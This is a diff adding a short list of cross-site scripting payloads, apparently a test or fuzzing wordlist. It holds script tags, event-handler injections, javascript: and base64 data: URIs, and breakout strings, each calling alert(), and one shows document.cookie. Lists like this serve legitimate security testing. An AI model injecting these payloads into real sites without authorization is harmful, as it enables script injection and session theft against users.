@@ -1,0 +1,15 @@
+<script>alert(1)</script>
+<script>alert('XSS')</script>
+<img src=x onerror=alert('XSS')>
+<img src=x onerror=alert(document.cookie)>
+<svg onload=alert(1)>
+<body onload=alert('XSS')>
+<iframe src="javascript:alert('XSS')">
+<a href="javascript:alert('XSS')">Click me</a>
+<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=">Click me</a>
+<input autofocus onfocus=alert('XSS')>
+<select onchange=alert('XSS')><option>1</option><option>2</option></select>
+<marquee onstart=alert('XSS')>XSS</marquee>
+<div onmouseover="alert('XSS')">Hover me</div>
+"><script>alert('XSS')</script>
+';alert('XSS');//
